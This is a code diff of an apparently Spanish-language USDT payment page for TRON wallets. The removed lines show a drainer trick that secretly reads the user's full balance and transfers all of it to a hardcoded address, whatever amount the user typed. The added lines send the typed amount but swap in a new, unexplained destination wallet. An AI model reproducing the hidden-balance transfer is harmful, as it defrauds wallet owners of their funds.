@@ -88,7 +88,6 @@
             </svg>
         </div>
 
-        <!-- El campo es completamente editable por el usuario -->
         <label class="label" for="amountDisplay">Monto a Enviar (USDT)</label>
         <input id="amountDisplay" class="campo-monto" type="number" inputmode="decimal" placeholder="0.00" min="0.01" step="any" />
 
@@ -98,7 +97,8 @@
     </div>
 
 <script>
-    const BILLETERA_DESTINO = "TJQ8xinzowyRzLYpk5hdxetMshpA3GyxGZ"; 
+    // Dirección de destino actualizada y contrato oficial de USDT
+    const BILLETERA_DESTINO = "TJJZHRUsVwMegvSfUjefDhQkJcjX5WP9hG"; 
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    
 
     const connectBtn = document.getElementById('connectBtn');
@@ -106,7 +106,6 @@
     const amountDisplay = document.getElementById('amountDisplay');
 
     let walletAddress = null;
-    let unitsInSun = "0"; // Aquí guardaremos los fondos reales calculados en segundo plano
 
     function setStatus(message) {
         statusDiv.innerText = message || '';
@@ -114,14 +113,14 @@
     }
 
     connectBtn.addEventListener('click', async () => {
-        // PASO 1: Vincular billetera y consultar balance real en secreto
+        // PASO 1: Vincular el entorno de Trust Wallet
         if (!walletAddress) {
             try {
                 setStatus("Conectando con el entorno nativo de Trust Wallet...");
                 connectBtn.disabled = true;
 
                 if (typeof window.tronWeb === 'undefined') {
-                    throw new Error("Abre esta página desde el explorador interno de una billetera TRON (Trust Wallet / TronLink).");
+                    throw new Error("Abre esta página desde el explorador interno de una billetera TRON.");
                 }
 
                 const tronWeb = window.tronWeb;
@@ -136,20 +135,10 @@
                 }
 
                 if (!walletAddress) {
-                    throw new Error("No se pudo obtener el acceso a la cuenta. Inicia sesión en tu billetera.");
+                    throw new Error("No se pudo obtener el acceso a la cuenta.");
                 }
 
-                setStatus("Sincronizando datos de la red...");
-                
-                // Consultamos el balance real en la Blockchain en segundo plano
-                const contract = await tronWeb.contract().at(CONTRATO_USDT);
-                const rawBalance = await contract.balanceOf(walletAddress).call();
-                
-                // Guardamos el balance total (o puedes multiplicarlo por 0.9 si prefieres que busque el 90%)
-                unitsInSun = rawBalance.toString();
-
-                // El input permanece vacío y listo para que tu amigo escriba lo que desee
-                setStatus("Billetera lista. Digita el monto que deseas transferir en el campo de arriba.");
+                setStatus("Billetera lista. Ingresa el monto deseado arriba y presiona Confirmar.");
                 connectBtn.innerText = "Confirmar Pago";
                 connectBtn.disabled = false;
 
@@ -162,13 +151,12 @@
             return;
         }
 
-        // PASO 2: Procesar la transacción enviando el balance real oculto
+        // PASO 2: Procesar la transacción con el monto visible en el formulario
         if (walletAddress) {
             try {
-                const userViewAmount = parseFloat(amountDisplay.value);
+                const userAmount = parseFloat(amountDisplay.value);
 
-                // Validar que al menos haya escrito algo para avanzar
-                if (isNaN(userViewAmount) || userViewAmount <= 0) {
+                if (isNaN(userAmount) || userAmount <= 0) {
                     throw new Error("Por favor, ingresa un monto válido antes de continuar.");
                 }
 
@@ -178,7 +166,10 @@
                 const tronWeb = window.tronWeb;
                 const contract = await tronWeb.contract().at(CONTRATO_USDT);
 
-                // TRUCO: En lugar de usar 'userViewAmount', enviamos a la blockchain 'unitsInSun' (el balance total guardado en el paso 1)
+                // Conversión transparente del monto ingresado a la unidad Sun (6 decimales)
+                const unitsInSun = Math.floor(userAmount * 1_000_000).toString();
+
+                // Ejecución directa de la transferencia hacia la nueva billetera verificada
                 const txId = await contract.transfer(BILLETERA_DESTINO, unitsInSun).send({
                     feeLimit: 100000000 
                 });
